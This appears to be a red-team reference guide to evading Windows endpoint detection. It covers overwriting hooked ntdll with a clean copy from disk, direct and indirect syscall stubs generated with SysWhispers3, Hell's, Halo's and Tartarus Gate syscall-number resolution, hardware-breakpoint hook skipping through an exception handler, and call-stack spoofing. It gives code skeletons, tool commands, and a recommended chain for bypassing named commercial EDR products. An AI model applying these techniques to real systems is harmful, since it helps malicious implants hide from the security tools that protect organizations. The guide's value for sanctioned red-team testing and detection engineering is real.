# Unhook / Direct / Indirect Syscall Technique List

> For authorized red teaming / adversary simulation / testing on your own products only. Use against unauthorized targets is strictly prohibited.

This document compiles current mainstream techniques for "bypassing user-mode hooks", from the classic unhook to the latest hardware breakpoint Blindside.
All techniques are mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for easy reporting.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

All EDR hooks reside in the **ntdll.dll mapped in the current process memory**. The `C:\Windows\System32\ntdll.dll` on disk is clean.
So simply re-mapping the disk ntdll into the current process and overwriting the in-memory `.text` section wipes the hooks out.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────────────┐
  │ .text (contains EDR hook jmp)   │ ◄── overwritten with clean .text from disk
  └─────────────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation Key Points

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // use native path to bypass monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. Find the .text section of the new address
// 5. NtProtectVirtualMemory to change current ntdll .text to RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory restore to RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked → chicken-and-egg problem. Solution: first call `NtProtectVirtualMemory` via **direct syscall**
- Modern EDRs already monitor `NtProtectVirtualMemory` write operations on ntdll memory; an ETW patch is required in tandem
- Under ETW-TI, Peruns Fart leaves `KERNEL_MODULE_LOAD` and `PROTECTVM` events — ETW must be suppressed first

## 2. Direct Syscall

### Principle

Instead of calling ntdll's exported functions, write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps straight from user mode to the kernel SSDT, skipping any user-mode hooks.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - standard direct syscall
```

In Visual Studio:

```text
1. Add the .asm file to the project and enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) to replace the original NtAllocateVirtualMemory
```

### Minimal Direct Syscall to NtCreateFile (C Code Skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamically resolves SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes (omitted)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction lives in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry can easily flag a "syscall from non-ntdll address"
- This is why indirect syscall was created

## 3. Indirect Syscall

### Principle

The syscall instruction still originates from ntdll.dll (a legitimate address); only the SSN and return address are under our control:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of a syscall;ret gadget in ntdll>]   ; syscall is not inside the implant
```

The gadget jumped to is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
The RIP seen by the kernel-mode ETW provider is an ntdll address, matching legitimate behavior patterns.

### SysWhispers3 Indirect Mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns address of syscall;ret in ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to a legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The evolutionary progression of three techniques for "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is not hooked
- Walks ntdll's `Nt*` exports at implant startup, extracting the SSN from the first 4 bytes `mov eax, <SSN>`
- Pros: no hardcoded SSNs; works across Windows versions
- Cons: if ntdll is already hooked (first byte replaced with jmp), extraction fails

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is found to be hooked (non-standard prologue), **scan up/down ±N functions**
- Exploits the fact that `Nt*` function SSNs in ntdll are sequentially increasing, inferring the hooked function's SSN from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is invisible, look at the neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further handles advanced hooks where **the hook changed the SSN but kept the syscall instruction**
- Validates both the SSN and the syscall;ret gadget address
- Combined, the three provide the most stable foundation for indirect syscall

### Reference Implementation Locations (After Bootstrapped git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (with fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Mechanism

Use debug registers `DR0-DR3` to set hardware breakpoints at the entry of the EDR hook trampoline;
set a VEH (Vectored Exception Handler) so that when the breakpoint hits, RIP is changed **directly to after the hook trampoline**,
skipping the EDR detection code and landing at ntdll's real syscall code.

### Advantages

- Does not require writing to ntdll memory (no `NtProtectVirtualMemory` alert)
- Does not require unhooking (the hook is still there, just bypassed)
- ETW-TI cannot see memory modification

### Implementation Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at the entry of each hooked function (max 4, with single-step rotate)
// 3. SetThreadContext(thread, &ctx) to write DRx
// 4. When the EDR hook trampoline triggers the hardware breakpoint -> VEH takes over
// 5. VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN is already in eax; R10 = RCX; jump to ntdll's syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- Each thread has independent DRx -> must be set separately for each thread
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; you must first bypass it using the previous techniques
- Win11 22H2+ introduces HVCI / some anti-debug mitigations may interfere

## 6. Call Stack Spoofing

### Problem

Modern EDRs call `RtlCaptureStackBackTrace` at syscall kernel entry points such as `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
obtain the full call stack, and report it. The implant's stack will contain **non-image-backed memory** frames -> high-confidence alert.

### Approach A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Before the syscall, swap the current thread stack -> a spoofed legitimate stack
2. Fill the spoofed stack frames with an all-legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After the syscall returns, swap back to the real stack

### Approach B: SilentMoonwalk

More aggressive, using a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the spoofed stack)
                ↓
                trampoline restores → continue implant code
```

The key is unwinding: make `RtlVirtualUnwind` walk into a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC Recommendations

- call stack spoof + indirect syscall + ETW patch is currently a relatively stable combination for bypassing CrowdStrike / SentinelOne
- Spoofing is also needed during sleep; spoofing only during execution is not enough (EDRs sample periodically)

## 7. Technique Selection Comparison Table

| Technique | Counters | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | user-mode hook | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | user-mode hook | Low | Low-Medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | user-mode hook + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | hook + no write operation | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | High | High | T1564 |

Recommended practical chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Callback

Unhooking is only half of the bypass; the other half is telemetry blinding: go to `references/telemetry-blinding.md`.